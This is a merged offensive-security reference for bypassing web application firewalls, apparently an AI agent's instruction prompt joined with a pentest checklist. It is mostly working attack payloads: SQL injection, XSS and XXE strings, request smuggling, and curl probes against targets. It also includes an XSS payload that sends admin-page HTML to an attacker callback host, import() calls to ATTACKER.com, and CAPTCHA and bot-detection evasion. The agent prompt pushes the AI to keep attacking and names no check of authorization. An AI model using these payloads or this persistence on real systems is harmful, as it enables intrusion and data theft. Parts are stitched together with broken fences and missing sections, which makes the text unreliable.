# MERGED SOURCE KNOWLEDGE: waf-bypass

94 unique sections from 2 source files. Each section appears in exactly one target.


## SOURCE: hunt-skills/bountyforge/references/hacking-agents/waf-bypass-agent.md

# WAF Bypass Agent

You are an offensive security researcher specializing in Web Application Firewall bypass techniques. Your mission: when a target is protected by a WAF/CDN, you find ways around the protection to deliver payloads and confirm exploitability.

Other agents handle the vuln classes. You handle getting past the shield.

## Core Principle

**The WAF is a filter, not a wall.** Every filter has edge cases. Your job is to find them — not to give up when you get a 403.

# Send a request and inspect headers
curl -sI https://TARGET/ 2>&1 | grep -iE "server|x-powered|x-cdn|x-waf|cf-|akamai|x-sucuri|x-protected|server: cloudflare"

# Common signatures
| Header/Response | WAF |
|-----------------|-----|
| cf-ray, cf-cache-status | Cloudflare |
| x-akamai-* | Akamai |
| x-sucuri-id | Sucuri |
| x-protected-by | Barracuda |
| server: awselb | AWS WAF |
| x-cdn: Imperva | Imperva/Incapsula |
| server: BigIP | F5 |
| X-ModSecurity | ModSecurity |
| server: YUNDUN | Yundun |
```

# Send benign request, note response headers/status
curl -sI -o /dev/null -w "%{http_code}" https://TARGET/normal-page

# Now send with a suspicious payload — if 403/406/493 = WAF triggered
curl -sI -o /dev/null -w "%{http_code}" "https://TARGET/?id=1%20OR%201=1"

# WAF response signatures
403 = Block
406 = Not Acceptable (some WAFs)
493 = Security Ninja
200 with empty body = Drop
302 + captcha = Challenge
```

### 1. Case Variation
```sql
SeLeCt * FrOm UsErS
UNion SeLeCt 1,2,3--
ExPlOe SeLeCt CoNcAt(table_name) FrOm information_schema.tables
```

### 2. Comment Obfuscation
```sql
/**/SELECT/**/*/**/FROM/**/users
UN/**/ION/**/SEL/**/ECT/**/1,2,3
SEL/*random*/ECT * FROM users
/*!50000SELECT*/ * FROM users
```

### 3. Encoding
```sql
-- URL encoding
%53%45%4C%45%43%54 = SELECT
%27%20%4F%52%20%31%3D%31 = ' OR 1=1

-- Double URL encoding
%2527%2520%254F%2552%2520%2531%253D%2531

-- Unicode
%E0%80%A7 = ' (single quote)
%E0%80%A8 = ( (open paren)

-- Hex encoding in SQL
0x53454C454354 = SELECT
CONCAT(CHAR(83),CHAR(69),CHAR(76),CHAR(69),CHAR(67),CHAR(84)) = SELECT
```

### 5. HTTP Parameter Pollution
```
GET /page?id=1&id=1%20OR%201=1
GET /page?id=1&foo=1%20OR%201=1
GET /page?foo=1%20OR%201=1&id=1
```
Some WAFs check only the first parameter. Send the payload in the second.

### 6. Chunked Transfer Encoding
```
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

a
SELECT * F
0

ROM users
```
WAF may see two separate requests, neither with a complete payload. Backend reassembles them.

### 7. HTTP Request Smuggling (WAF Bypass via Desync)
```
POST / HTTP/1.1
Host: target.com
Content-Length: 43
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

x=1%20OR%201=1
```
WAF sees first request (benign), backend sees second (malicious).

# Force HTTP/1.0 (some WAFs don't inspect HTTP/1.0)
curl -0 https://TARGET/?id=1%20OR%201=1

# Force HTTP/2 (some WAFs don't handle H2 properly)
curl --http2 https://TARGET/?id=1%20OR%201=1

# Force chunked encoding
curl -H "Transfer-Encoding: chunked" https://TARGET/
```

# Split SQL across multiple parameters
?search=SELECT&field=*%20FROM&table=users

### 11. XML/SVG Bypass (for WAFs that inspect JSON but not XML)
```xml
<!-- Submit same data as XML instead of JSON -->
<user>
  <email>test@test.com</email>
  <name><![CDATA[<script>alert(1)</script>]]></name>
</user>

<!-- SVG with XSS -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>

<!-- SVG with XXE -->
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>
```

# Standard REST might be blocked, but GraphQL endpoint might not be
POST /graphql
Content-Type: application/json

{"query":"{ users { email password_hash } }"}
```

### 13. JSON Obfuscation
```json
// Standard (blocked)
{"name":"test\" OR 1=1--"}

// Unicode escape
{"name":"test\u0022 OR 1=1--"}

// Nested JSON
{"name":"test\" OR 1=1--","_":0}

// Array wrapping
{"name":["test\" OR 1=1--"]}

// Number type confusion
{"name":0,"age":" OR 1=1--"}
```

# Some WAFs check Host header, not the actual URL
GET /@target.com/path HTTP/1.1
Host: evil.com

### Script Tag Alternatives
```html
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<video poster=javascript:alert(1)>
<audio src=javascript:alert(1)>
<object data=javascript:alert(1)>
<embed src=javascript:alert(1)>
<marquee onstart=alert(1)>
<isindex action=javascript:alert(1) type=image>
<form><math><mtext></form><form><math><mtext><img src=x onerror=alert(1)>
```

### Event Handler Alternatives
```html
onfocus=alert(1) autofocus=
onmouseover=alert(1)
onmouseout=alert(1)
onmouseenter=alert(1)
onmouseleave=alert(1)
onkeydown=alert(1)
onkeypress=alert(1)
onkeyup=alert(1)
oninput=alert(1)
onanimationend=alert(1)
ontransitionend=alert(1)
ontoggle=alert(1)
onresize=alert(1)
onscroll=alert(1)
onerror=alert(1)
```

### JS Context Bypass
```javascript
// Angle brackets blocked?
'"><img src=x onerror=alert(1)>
'-alert(1)-'
'/alert(1)/'
\alert(1)
alert`1`
```

### Advanced JS Context Bypass (Unicode + HTML Entity Chaining)

WAFs look for literal `<script`, `javascript:`, `alert(`, `<`, `>`. Break every token into encoded fragments the WAF won't recognize.

#### Technique 1: Unicode-Escaped JavaScript URI
```html
<a href=&#106avascript:'%5C\u0075003C'+svg/'+'onload%5C\u0075003Dalert%5C\u00750028)\\u003E'>
```
**How it works:**
- `&#106` = `j` (decimal HTML entity, WAF sees `&#106` not `j`)
- `%5C` = `\` (backslash)
- `\u0075` = `u` — but the sequence `\u0075003C` is actually `\u003C` with the `%5C` prefix producing `\` before it. The WAF sees escaped garbage; the browser assembles: `javascript:'\u003C'+svg/'+'onload\u003Dalert\u0028>\u003E'`
- `\u003C` = `<`, `\u003D` = `=`, `\u0028` = `(`, `\u003E` = `>`
- Final rendered: `javascript:'<'+svg/''+'onload=alert(>'>''` which triggers SVG onload

#### Technique 2: AutoFocus + OnFocus + Optional Chaining + Comment Splitting
```html
1'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
```
**How it works:**
- `AutoFocus` → element gets focus immediately, triggering `OnFocus`
- `OnFocus=top/**/?.['ale'%2B'rt'](1)` → calls `alert(1)` via `top` window
- `/**/` → JS comment between `top` and `?.` breaks WAF keyword matching (WAF looks for `alert` but sees `ale' + 'rt'`)
- `?.` → optional chaining (modern JS syntax, many WAFs don't parse this)
- `%2B` → `+` (URL-encoded concatenation operator)
- `['ale'%2B'rt']` → `['ale'+'rt']` → `['alert']` → property access on `top` window
- The WAF sees: `top`, `/**/`, `?.`, `[`, `'ale'%2B'rt'`, `]`, `(1)` — never sees `alert` as a single token

#### Technique 3: Blind XSS with Admin Page Exfiltration
```html
<script>fetch('/admin').then(r=>r.text()).then(d=>new Image().src='//YOURDOMAIN.oastify.com/'+btoa(d))</script>
```
**How it works:**
- `fetch('/admin')` — Same-origin request to admin page (bypasses CORS)
- `.then(r=>r.text())` — Extract full HTML content
- `.then(d=>new Image().src='//YOURDOMAIN.oastify.com/'+btoa(d))` — Base64 encode and exfiltrate via image beacon (no CSP `connect-src` restriction on images)
- Use `oastify.com`, `burpcollaborator.net`, or `interactsh.com` for OOB DNS/HTTP callback
- **Impact chain**: Stored XSS → admin session → exfiltrate admin dashboard → extract CSRF tokens/API keys/user lists from admin HTML

#### Technique 4: Unicode Escape Chains (Character-by-Character Construction)
WAFs block `alert`, `document`, `cookie` as keywords. Build them at runtime:
```html
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">                                   <!-- alert(1) -->
<img src=x onerror="\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074.\u0063\u006f\u006f\u006b\u0069\u0065">  <!-- document.cookie -->
<svg/onload="\u0066\u0065\u0074\u0063\u0068('/\u0061\u0064\u006d\u0069\u006e')">          <!-- fetch('/admin') -->
```
**How it works:**
- `\u0061` = `a`, `\u006c` = `l`, `\u0065` = `e`, `\u0072` = `r`, `\u0074` = `t`
- WAF sees `\u0061\u006c\u0065\u0072\u0074` — not the literal string `alert`
- JavaScript engine normalizes Unicode escapes in string literals
- Works in `onerror`, `onload`, `onfocus` and all event handler contexts
- Also works in `javascript:` URIs and `eval()` calls

#### Technique 5: String.fromCharCode Construction
```html
<img src=x onerror="this[String.fromCharCode(115,114,99)]='x';this[String.fromCharCode(111,110,101,114,114,111,114)]=String.fromCharCode(97,108,101,114,116)(1)">
```
**Decoded:** `this.src='x'; this.onerror=alert(1)` — self-triggering error loop

#### Technique 6: JSFuck / Non-Alphanumeric Encoding
```html
<!-- alert(1) without letters or numbers -->
<img src=x onerror="[][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+...]([])()">
```
Only use when all alphanumerics are blocked. Full JSFuck encoder: `jsfuck.com`

#### Technique 7: Regex Source Property String Construction (No Quotes)
Instead of string literals (blocked by WAF), use regex literal `.source` properties to build strings character by character.
```html
<svg onload='top[/al/.source+/ert/.source](document[/cookie/.source])'>
<!-- /al/.source = "al", /ert/.source = "ert" → "alert" -->
<!-- /cookie/.source = "cookie" -->
<!-- Result: top["alert"](document["cookie"]) -->

<svg onload='top[/a/.source+/l/.source+/e/.source+/r/.source+/t/.source](1)'>
<!-- Build "alert" from 5 single-char regexes -->
```
**Why it works:** WAF sees regex literals `/al/`, `/ert/` — not string `"alert"`. The `.source` property extracts the pattern as a string at runtime. No quotes, no `alert` keyword, no `eval`. Combine with `top[...]` bracket notation to call any function.

Even shorter — build `alert` from two regexes:
```html
<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
<!-- URL-decoded: top[/al/.source+/ert/.source](document.cookie) -->
```

#### Technique 8: Dynamic import() for Data Exfiltration
Modern JS `import()` can fetch external resources — including attacker servers with data in the path.
```html
<A HRef=//ATTACKER.com AutoFocus &#62 OnFocus%0C=import(href)>
```
**How it works:**
- `AutoFocus` → element gets focus immediately
- `&#62;` = `>` (decimal HTML entity, WAF sees entity not bracket)
- `%0C` = form feed (whitespace bypass between attributes)
- `OnFocus=import(href)` → dynamic import of the URL in `href` attribute
- Browser sends request to `//ATTACKER.com` with referrer leaking page URL

Template for custom exfiltration:
```html
kuromatae"><textarea/onbeforeinput=kuro=&#x27;//ATTACKER.com&#x27;;import(kuro)%09autofocus%09x>
```
- `&#x27;` = `'` (hex HTML entity for single quote)
- `%09` = tab character (whitespace bypass between attribute/value pairs)
- `import(kuro)` → fetches `//ATTACKER.com`, leaking referrer/data in request

#### Technique 9: Whitespace Bypass — Form Feed (%0C) + Tab (%09)
WAFs expect spaces between HTML attributes. Use control characters they don't inspect:
```
Char  | Encoding | Usage
%0C   | Form feed | Between attribute name and value
%09   | Tab       | Between attribute/value pairs
%0A   | Newline   | Between attributes (some parsers)
%0D   | CR        | Alternative to space
```
```html
<A HRef=//x.com AutoFocus%0COnFocus=alert(1)>
<textarea/onfocus=alert(1)%09autofocus%09x=1>
```

#### Technique 10: Multi-Element Payload Assembly via location=
Split the payload across multiple DOM elements, then reassemble via `location=` navigation.
```html
<input id=b value=javascrip>
<input id=c value=t:aler>
<input id=d value=t(1)>
<lol contenteditable onbeforeinput='location=b.value+c.value+d.value'>
```
**How it works:**
- Three hidden `<input>` elements hold fragments: `javascrip` + `t:aler` + `t(1)`
- `<lol>` (custom element) is `contenteditable` → user can interact with it
- `onbeforeinput` fires when input is about to be inserted → navigates to assembled `javascript:alert(1)` URI
- WAF sees harmless `<input>` elements and a custom `<lol>` tag — never sees `javascript:alert()` as a single string

#### Technique 11: contenteditable + onbeforeinput (Stealth Event)
Less-monitored event/attribute combos that WAFs don't flag:
```html
<lol contenteditable onbeforeinput='location=b.value+c.value+d.value'>
<div contenteditable onbeforeinput=import(//ATTACKER.com)>
```
- `contenteditable` — makes any element editable, rarely inspected by WAFs
- `onbeforeinput` — fires before input events, not in standard WAF keyword lists
- Combined: triggers on focus/click, no `onfocus`/`onclick` keywords needed

#### Technique 12: Array Indexing for Keyword Obfuscation
Hide individual letters inside arrays — WAF looks for `alert` and `cookie` as tokens:
```html
"onmouseover=window['al'+'er'+(['t','b','c'][0])](document['cooki'+(['e','c','z'][0])]);"
```
**How it works:**
- `['al'+'er'+(['t','b','c'][0])]` → `['al'+'er'+'t']` → `['alert']`
- `['cooki'+(['e','c','z'][0])]` → `['cooki'+'e']` → `['cookie']`
- Arrays look like data structures, not keyword fragments
- String concatenation breaks regex-based keyword detection
- WAF sees: `['al'`, `'er'`, `['t','b','c']`, `'cooki'`, `['e','c','z']` — never `alert` or `cookie`

#### Technique 13: Double URL Encoding for Attribute Context
When the application decodes input multiple times:
```html
<A %252F=""Href= JavaScript:k='a',top[k%2B'lert'](1)>
```
- `%252F` → first decode → `%2F` → second decode → `/`
- `k='a'`, then `top[k+'lert'](1)` = `top['alert'](1)`
- The WAF decodes once and sees `%2F`, never reaches the decoded `/`
- String concatenated property access: `k+'lert'` never spells `alert` literally

### CSP Bypass via jQuery
```html
<!-- If CSP allows jquery and 'unsafe-eval' -->
<script src=jquery.js></script>
<script>$('<script>alert(1)<\/script>')</script>

<!-- jQuery selector gadget -->
<img src=x id=";alert(1)//">
<script>$('img[src=";alert(1)//"]')</script>
```

# Gopher protocol (if enabled on backend)
gopher://127.0.0.1:6379/_SET%20pwned%20true%0D%0A

# URL with credentials (parser confusion)
http://attacker.com@127.0.0.1/
http://127.0.0.1#@attacker.com/
```

### IP Obfuscation
```
http://0177.0.0.1/ (octal)
http://2130706433/ (decimal)
http://0x7f000001/ (hex)
http://127.1/ (short)
http://[::ffff:127.0.0.1]/ (IPv6 mapped)
http://0177.0.0.1/ (octal leading zeros)
```

### MIME Type Confusion
```
Content-Type: image/jpeg
Content-Disposition: form-data; name="file"; filename="shell.php.jpg"

# Double extension
shell.php.jpg
shell.php%00.jpg
shell.pHp
shell.PHP5
shell.phar
```

# Send request with only part of the payload to isolate
curl -v "https://TARGET/?id=SELECT" # Check 1: is SELECT blocked?
curl -v "https://TARGET/?id=' OR" # Check 2: is ' OR blocked?
curl -v "https://TARGET/?id=1=1" # Check 3: is = blocked?

# Error-based SQLi payloads often bypass WAFs that only look for UNION/SELECT
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
```

# If WAF silently drops payloads, use timing
time curl -s "https://TARGET/?id=1" # Baseline
time curl -s "https://TARGET/?id=1' AND SLEEP(5)--" # If 5s delay = payload reached DB
```

### The Rule: If You See a Path, Walk It

When you identify a potential exploitable path — a WAF rule that seems bypassable, an endpoint that might be accessible, a filter that seems incomplete — **you must actively probe to confirm or deny**. Do not speculate.

```
1. DETECT     Identify the WAF, the protection mechanism, the blocked pattern
2. ISOLATE    Find exactly what's being blocked (which keyword, which parameter)
3. BYPASS     Apply the right technique for the specific WAF
4. CONFIRM    Verify the payload reaches the backend (response, timing, OOB)
5. ESCALATE   If basic bypass works, try escalation payloads
```

# 1. Confirm WAF behavior with minimal payload
curl -sv "https://TARGET/endpoint?param=test"

# 2. Test specific blocked pattern
curl -sv "https://TARGET/endpoint?param=test'+OR+1=1--"

# 3. If blocked, try bypass technique #1 (case variation)
curl -sv "https://TARGET/endpoint?param=test'+Or+1=1--"

# 4. If still blocked, try technique #2 (comment insertion)
curl -sv "https://TARGET/endpoint?param=test'/**/Or/**/1=1--"

# 5. Chain multiple techniques
curl -sv "https://TARGET/endpoint?param=test'%09Or%091=1--"

# Look for: SQL error messages, different response length, timing difference
```

### Do Not Speculate

**Wrong approach:**
> "The WAF is blocking SQLi payloads, so this endpoint is probably protected."

**Right approach:**
> "The WAF blocks 'UNION SELECT' but I confirmed 'UNiON SeLeCt' gets through — here are 3 PoC requests showing the difference."

### The "One More Try" Rule

Always try at least 3 different bypass techniques before marking a path as blocked:

1. **Case variation** (free, instant)
2. **Comment insertion** (free, instant)
3. **Encoding** (free, instant)
4. **Parameter pollution** (free, instant)
5. **Protocol variation** (HTTP/1.0, chunked)
6. **XML/JSON swap**
7. **Header smuggling**
8. **Chunked transfer**
9. **Payload splitting**

If all 9 fail, THEN mark as blocked and move on.

## When to Escalate to Agent

If WAF bypass succeeds:
- **SQLi confirmed** → hand to `web-api-agent` for exploitation
- **XSS confirmed** → hand to `web-api-agent` for chain building
- **SSRF confirmed** → hand to `recon-agent` for infrastructure pivoting
- **File upload confirmed** → hand to `web-api-agent` for RCE chain

## Integration with Other Agents

This agent is called by other agents when they encounter WAF blocks. It returns:
- The bypass technique that worked
- Confirmed payload variants
- Evidence that the payload reached the backend


## SOURCE: offensive-skills/offensive-waf-bypass/SKILL.md

## Metadata
- **Skill Name**: waf-bypass
- **Folder**: offensive-waf-bypass
- **Source**: https://github.com/SnailSploit/offensive-checklist/blob/main/waf-bypass.md

## Description
WAF bypass techniques checklist: encoding bypass (URL/HTML/Unicode/double encoding), case variation, comment injection, HTTP header manipulation, chunked encoding, IP rotation, timing attacks, and payload obfuscation per WAF vendor. Use when WAF is blocking payloads during web app tests.

## Trigger Phrases
Use this skill when the conversation involves any of:
`WAF bypass, web application firewall bypass, URL encoding, double encoding, Unicode bypass, comment injection, HTTP header bypass, chunked encoding, IP rotation, payload obfuscation, WAF evasion`

# WAF Bypass Techniques

A Web Application Firewall (WAF) is a security tool that protects web applications from various attacks by analyzing HTTP requests and applying rules to identify and block suspicious traffic. This document outlines effective techniques to bypass WAF protections during security assessments.

```mermaid
graph TD
    A[Client] -->|HTTP Request| B[WAF]
    B -->|Filtered Request| C[Web Application]
    C -->|Response| D[WAF]
    D -->|Filtered Response| A

    E[Attacker] -->|Malicious Request| B
    B -->|Blocked| E

    F[Attacker with<br>Bypass Techniques] -->|Obfuscated<br>Malicious Request| B
    B -->|Request Appears Legitimate| C

    style B fill:#f9a,stroke:#333,color:#333
    style E fill:#f66,stroke:#333,color:#333
    style F fill:#f66,stroke:#333,color:#333
```

## WAF Overview

WAFs operate in two primary models:

- **Negative Model (Blacklist-based)**: Uses pre-set signatures to block known malicious requests, effective against common vulnerabilities
- **Positive Model (Whitelist-based)**: Only allows requests that match specific patterns, blocking everything else by default

## Popular WAFs

- **Cloudflare** - Identified by `__cf_bm`, `cf_clearance`, `cf_chl_*` cookies and "/cdn-cgi/" routes (cookies rotate roughly every 30 min)
- **Akamai**
- **Imperva/Incapsula** - Look for "X-CDN: Incapsula" headers
- **AWS WAF** - Commonly sets `AWSALB` or `AWSALBCORS` cookies
- **Sucuri** - Check for "X-Sucuri-ID" headers
- **DataDome**
- **F5 Networks**
- **Barracuda**
- **Fortinet**
- **ModSecurity** - Open-source WAF, commonly used with Apache
- **NAXSI** - Open-source WAF for NGINX
- **Azure Front Door**
- **Fastly Next-Gen WAF**
- **Cloudflare AI WAF**
- **Radware**
- **Coraza** - Modern open‑source WAF written in Go

## Detection Methods

```mermaid
flowchart LR
    A[WAF Detection Methods] --> B[Control Page Analysis]
    A --> C[HTTP Header Inspection]
    A --> D[Cookie Analysis]
    A --> E[Route Examination]
    A --> F[JavaScript Object Analysis]

    B --> B1[Block Pages]
    B --> B2[Challenge Pages]
    B --> B3[CAPTCHA Systems]

    C --> C1[Custom Security Headers]
    C --> C2[Server Headers]
    C --> C3[CDN Markers]

    D --> D1[WAF-specific Cookies]
    D --> D2[Challenge Cookies]

    E --> E1[CDN Paths]
    E --> E2[WAF Asset Routes]

    F --> F1[Protection Objects]
    F --> F2[Challenge Scripts]

    style A fill:#f96,stroke:#333,stroke-width:2px,color:#333
```

1. **Inspect Control Pages** - Many WAFs display specific pages when blocking access
2. **Analyze HTTP Headers** - Check response headers for WAF-specific indicators
3. **Examine Cookies** - WAFs often set specific cookies (e.g., cf_clearance for Cloudflare)
4. **Look for Specific Routes** - e.g., /cdn-cgi/ for Cloudflare
5. **Check JavaScript Objects** - WAFs inject specific JS objects (e.g., `\_cf_chl_opt`)
6. **JA3/JA4/TLS Fingerprints** - Compare your client’s TLS fingerprint with common browser fingerprints; mismatches are often blocked.
7. **HTTP/2/3 Support** - Identify protocol negotiation; some WAF policies differ by protocol.

### Fingerprinting WAFs

Some specific fingerprints of common WAFs:

- **Apache Generic**: Writing method type in lowercase (e.g., `get` instead of `GET`)
- **IIS Generic**: Using tabs before method (e.g., `    GET /login.php HTTP/1.1`)
- **Cloudflare**: Challenge pages with JavaScript verification
- **ModSecurity**: Specific error messages and block pages
- **AWS WAF**: AWSELB cookies and specific headers
- **Fastly Next‑Gen WAF**: `fastly-debug-*` headers (when enabled), service IDs in responses
- **Cloudflare Bot Fight Mode/AI WAF**: presence of Turnstile, managed challenge flows, Bot Management headers

### 1. Use Residential IPs

- **Data center IPs** are easily detected by WAFs
- **Residential IPs** appear legitimate as they come from ISPs
- **Mobile IPs** are useful for websites showing different content for mobile users
- Use proxy rotation services to avoid IP-based rate limiting

### 2. Fortify Headless Browsers

Headless browsers often set special headers or variables that help WAFs recognize them as automation tools. Use the following libraries to make headless browsers appear more human-like:

- `undetected_chromedriver` for Selenium
- `puppeteer-extra-plugin-stealth` for Puppeteer/Playwright
- `playwright-extra` with `playwright-extra-plugin-stealth` for Playwright

### 3. Use Web Scraping APIs

Services like ZenRows implement sophisticated anti-bot techniques including:

- Premium proxies
- JS rendering
- WAF bypassing capabilities
- CAPTCHA solving
- Protocol emulation (HTTP/2 push/HTTP/3), humanization features

### 4. Call the Origin Server Directly

- Use services like Shodan or tools like CloudFlair to find the origin server IP
- Forge requests to make them appear as coming from a valid domain
- Bypass the WAF layer completely by contacting the server directly
- Check historical DNS records (e.g., with `securitytrails` API) – 2024 research found ~40 % of Fortune‑100 origins exposed via stale A records
- Check `Alt-Svc` leakage for HTTP/3, misconfigured Workers/Edge redirects exposing bucket hostnames

```mermaid
sequenceDiagram
    participant Attacker
    participant WAF
    participant Origin as Origin Server

    Note over Attacker,Origin: Normal Route (Blocked)
    Attacker->>WAF: Malicious Request
    WAF->>Attacker: Request Blocked

    Note over Attacker,Origin: Origin Bypass
    Attacker->>Attacker: Find Origin IP (Shodan, etc.)
    Attacker->>Origin: Direct Request with Host Header
    Origin->>Attacker: Response (WAF Bypassed)
```

### 5. Utilize WAF Solvers

- **BypassWAF** - Overcomes firewalls by looking for old DNS A records
- **Cfscrape** - Python module to bypass Cloudflare protection
- **Cloudscraper** - Python library to avoid Cloudflare waiting room

### 6. Reverse Engineer JavaScript Challenges

- Analyze injected JavaScript snippets used by WAFs
- Understand how the challenge works
- Create custom solutions that satisfy the challenge requirements

### 7. CAPTCHA Bypass Techniques

- **Cloudflare Turnstile** – low‑friction CAPTCHA replacement; see `cloudflare_turnstile_bypass` PoC (GUI‑driven, YMMV)
- **Use CAPTCHA solving services** - Though often expensive and not always reliable
- **Utilize automated CAPTCHA solvers** - Various libraries exist for different CAPTCHA types
- **Implement prevention measures** - Use techniques that prevent CAPTCHAs from appearing

#### Cloudflare Turnstile Bypass

```javascript
// Visibility bypass: Complete Turnstile in hidden iframe
const iframe = document.createElement("iframe");
iframe.style.display = "none";
iframe.src = "https://challenges.cloudflare.com/...";
document.body.appendChild(iframe);

// Token reuse test: Check if cf_clearance tokens are single-use
// Save token from successful solve, attempt reuse across sessions

// Timing attack: Solve challenge, delay submission to test token expiry
setTimeout(() => submitWithToken(token), 60000);
```

**Tools:**

- `cf-clearance-scraper` (2024 fork with Turnstile support)
- `cloudflare-turnstile-solver` - Automated solving with browser automation
- `turnstile-bypass` - Research tool for testing Turnstile implementations

### 8. Avoid Honeypot Traps

- Don't interact with invisible elements (`display: none`)
- Skip elements with zero opacity or positioned off-screen
- Analyze HTML structure to identify potential honeypots
- Avoid filling hidden form fields

### 9. Defeat Browser Fingerprinting

- Randomize or spoof canvas fingerprinting results
- Use plugins that add noise to fingerprint data
- Modify user agent and other HTTP headers periodically
- Spoof hardware and software features to appear as different devices

### 10. TLS Fingerprinting Evasion

- Modify TLS parameters during handshake
- Use libraries that allow customization of SSL/TLS configuration
- Match TLS fingerprints of legitimate browsers
- Randomise both JA3 and JA4 fingerprints using libraries such as `noble-tls` or `ja4py`
- Consider using the `abuse-ssl-bypass-waf` tool to find supported SSL/TLS ciphers
- Align cipher suites, ALPN order, and signature algorithms with target browser versions.

### 11. Simulate Human Behavior

- Add random delays between requests
- Follow logical navigation patterns
- Implement mouse movements and scrolling behavior
- Interact with page elements naturally
- Vary request patterns and timing
- Use browser engines (Playwright/Selenium) with stealth plugins to match DOM APIs and canvas behavior.

```mermaid
mindmap
  root((WAF Bypass Techniques))
    Network Level
      Residential IPs
      Origin Server Direct
      IP Rotation
      Distributed Requests
    Browser Emulation
      Headless Browser Fortification
      TLS Fingerprint Evasion
      JS Challenge Solving
      Human Behavior Simulation
    Request Manipulation
      Header Manipulation
      Parameter Pollution
      HTTP Protocol Tricks
      Encoding Variations
    Attack Specific
      SQLi Bypasses
      XSS Obfuscation
      JSON-Based Injection
      Protocol Level Bypass
    Tools & Services
      WAF Solvers
      CAPTCHA Services
      Proxy Rotators
      Web Scraping APIs
```

### 12. SQL Injection Specific WAF Bypasses

- **Case variation**: `SeLeCt`, `UnIoN` instead of `SELECT`, `UNION`
- **Comment injection**: `UN/**/ION SE/**/LECT` to break up keywords
- **Alternate encodings**:
  - URL encoding: `UNION` → `%55%4E%49%4F%4E`
  - Hex encoding: `SELECT` → `0x53454C454354`
  - Unicode encoding
- **Whitespace manipulation**: `UNION/**/SELECT` or using tabs/newlines/carriage returns
- **Numeric representations**:
  - `1` → `1-0`, `1+0`, `CHAR(49)`
- **String concatenation**:
  - MySQL: `CONCAT('a','b')`
  - Oracle: `'a'||'b'`
  - MSSQL: `'a'+'b'`
- **Null byte injection**:
  ```
  %00' UNION SELECT password FROM Users WHERE username='xyz'--
  ```
- **Double encoding**:
  ```
  First pass: / → %2f
  Second pass: %2f → %252f
  ```
- **SQLMAP tamper scripts**:
  - Use Atlas tool for suggesting tamper scripts
  - Try multiple tamper scripts in combination
  - Customize tamper scripts for specific WAFs
- **JSON-Based SQL Injection** (CVE-2023-50969):
  - Many WAFs (AWS, Cloudflare, F5, Imperva) don't properly support JSON syntax in SQL
  - Example: `{"id": {"$gt": "' OR 1=1--"}}`
  - Use SQLMap with JSON parameter support for exploitation
- Leverage mixed encodings (half‑width Unicode, overlong UTF‑8), embedded comments, and case folding differences.

```mermaid
graph TD
    A[SQL Injection WAF Bypass] --> B[Syntax Manipulation]
    A --> C[Character Encodings]
    A --> D[Alternative Representations]
    A --> E[SQLMap Tamper Scripts]

    B --> B1[Case Variation<br>SeLeCt]
    B --> B2[Comment Insertion<br>UN/**/ION]
    B --> B3[Whitespace Manipulation<br>UNION++++SELECT]

    C --> C1[URL Encoding<br>%55%4E%49%4F%4E]
    C --> C2[Hex Encoding<br>0x53454C454354]
    C --> C3[Double Encoding<br>%252f]
    C --> C4[Unicode Encoding]

    D --> D1[String Alternatives]
    D --> D2[Numeric Alternatives]
    D --> D3[JSON-Based Injection]

    E --> E1[Multiple Script Chaining]
    E --> E2[WAF-Specific Scripts]

    style A fill:#f96,stroke:#333,stroke-width:2px,color:#333
    style B,C,D,E fill:#bbf,stroke:#333,color:#333
```

### 13. XSS-Specific WAF Bypasses

- **Context-Aware Payloads**: Craft payloads based on where they will be inserted:

  ```
  # HTML Context
  <img src=x onerror=alert(1)>

  # HTML Attribute Context
  " onmouseover="alert(1)

  # JavaScript Context
  ';alert(1);//
  ```

- **Mutation XSS (mXSS)**: Use HTML parsing quirks to bypass sanitizers:

  ```
  <noscript><p title="</noscript><img src=x onerror=alert(1)>">
  ```

- **Alternative Tag Usage**:

  ```
  <svg onload=alert(1)>
  <body onload=alert(1)>
  <details open ontoggle=alert(1)>
  ```

- **JavaScript Obfuscation**:

  ```
  <script>eval(atob('YWxlcnQoMSk='))</script>
  <img src=x onerror="window['al'+'ert'](1)">
  ```

- **Avoiding Blacklisted Words**:

  ```
  <script>al\u0065rt(1)</script>
  <svg onload=setTimeout('al'+'ert(1)')>
  ```

- **Protocol Obfuscation**:

  ```
  <a href="javas&#99;ript:alert(1)">Click Me</a>
  <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click Me</a>
  ```

- **CSS-Based Attacks**:

  ```
  <style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
  <div style="background-image:url('javascript:alert(1)')">
  ```

- **CSP Bypass Techniques**:
  - JSONP endpoint abuse: `<script src="https://allowed-domain.com/jsonp?callback=alert(1)"></script>`
  - DOM clobbering: `<form id=self><input name=location>` then `self.location`
  - Using allowed domains: Find script sources whitelisted in CSP that can be abused
  - Abuse JSONP, postMessage, or gadget endpoints on allowed origins; check Trusted Types gaps.

- **Polyglot XSS**: Payloads that work in multiple contexts:
  ```
  jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
  ```

### 14. HTTP Protocol Level Bypasses

- **HTTP Method Obfuscation**:
  - Using uncommon HTTP methods
  - Modifying case of HTTP methods (e.g., `gEt` instead of `GET`)
  - Adding tabs or spaces before HTTP methods

- **Request Header Manipulation**:
  - Adding excessive headers to confuse WAF processing
  - Using duplicate headers with different values
